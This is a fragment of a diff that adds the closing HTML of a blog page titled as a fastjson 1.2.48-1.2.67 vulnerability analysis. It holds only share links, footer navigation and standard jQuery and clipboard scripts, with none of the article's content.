+  <li><a class="icon" href="mailto:?subject=fastjson 1.2.48-1.2.67漏洞分析&body=Check out this article: http://blog.ninefiger.top/2022/11/11/fastjson%201.2.48-1.2.67%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.48-1.2.67%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.48-1.2.67漏洞分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.48-1.2.67%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.48-1.2.67漏洞分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.48-1.2.67%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.48-1.2.67漏洞分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.48-1.2.67%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.48-1.2.67漏洞分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.48-1.2.67%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&name=fastjson 1.2.48-1.2.67漏洞分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.48-1.2.67%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&t=fastjson 1.2.48-1.2.67漏洞分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2017-2022
+    ninefiger
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/link">链接</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
